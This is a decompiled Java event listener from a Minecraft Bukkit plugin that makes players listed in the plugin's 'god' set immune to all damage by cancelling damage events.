/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.entity.EntityDamageByEntityEvent
 */
package me.qlutch.sucks.events;

import me.qlutch.sucks.Core;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;

public class GodModeListener
implements Listener {
    private static Core plugin = Core.getPlugin(Core.class);

    @EventHandler
    public void onHit(EntityDamageByEntityEvent q) {
        Entity e = q.getEntity();
        if (e instanceof Player) {
            Player p = ((Player) e).getPlayer();
            if (plugin.god.contains(p.getName())) {
                q.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void onDamage(EntityDamageEvent q) {
        Entity e = q.getEntity();
        if (e instanceof Player) {
            Player p = ((Player) e).getPlayer();
            if (plugin.god.contains(p.getName())) {
                q.setCancelled(true);
            }
        }
    }
}

